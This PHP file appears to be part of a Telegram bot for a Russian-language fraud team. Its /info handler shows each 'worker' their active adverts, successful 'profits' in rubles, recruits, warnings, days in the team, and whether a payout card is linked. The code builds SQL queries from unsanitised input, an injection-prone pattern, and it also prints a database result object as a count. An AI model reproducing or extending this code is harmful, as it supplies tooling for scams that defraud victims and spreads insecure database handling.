<?php

	if(preg_match('/\/info/i', $message['text']) == TRUE) {
		$user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `balance`, `card`, `stake`, `warns`, `created` FROM `accounts` WHERE `telegram` = '$message[from]' AND `access` > '0'"));
		
		$stake = explode(':', $user['stake']);
		
		$text = "👹 <b>Информация о вашем аккаунте:</b>\n\n";
		$text .= "🆔 <b>Telegram ID:</b> <a href=\"tg://user?id=$message[from]\">$message[from]</a>\n";
		#$text .= "💵 <b>Баланс:</b> <code>$user[balance] руб.</code>\n";
		#$text .= "💸 <b>Ваша ставка:</b> <code>оплата - $stake[0]% и возврат - $stake[1]%</code>\n";
		$adverts = mysqli_query($connection, "SELECT `id` FROM `adverts` WHERE `worker` = '$message[from]' AND `status` = '1'");
		$text .= "🧾 <b>Активных объявлений:</b> <code>$adverts</code>\n";
		$profit = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count`, SUM(`amount`) AS `total` FROM `payments` WHERE `worker` = '$message[from]' AND `status` = '1'"));
		if($profit['total'] == NULL) $profit['total'] = '0';
		$text .= "📋 <b>Успешных профитов:</b> <code>$profit[count]</code>\n";
		$text .= "💰 <b>Общий профит:</b> <code>$profit[total] руб.</code>\n";
		$invites = mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS `count` FROM `accounts` WHERE `inviter` = '$message[from]' AND `access` > '0'"));
		$text .= "👹 <b>Приглашено:</b> <code>".Endings($invites['count'], "воркер", "воркера", "воркеров")."</code>\n";
		$text .= "⚠️ <b>Предупреждений:</b> <code>[$user[warns]/3]</code>\n";
		$text .= "👻 <b>В команде:</b> <code>".Endings(floor((time()-$user['created'])/86400), "день", "дня", "дней")."</code>\n";
		if($user['card'] == 0) $text .= "\n💳 <b>Карта не привязана, свяжитесь с модераторами!</b>\n";
		if($user['card'] != 0) $text .= "\n💳 <b>Карта привязана — можно воркать!</b>\n";
		
		send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
	}

?>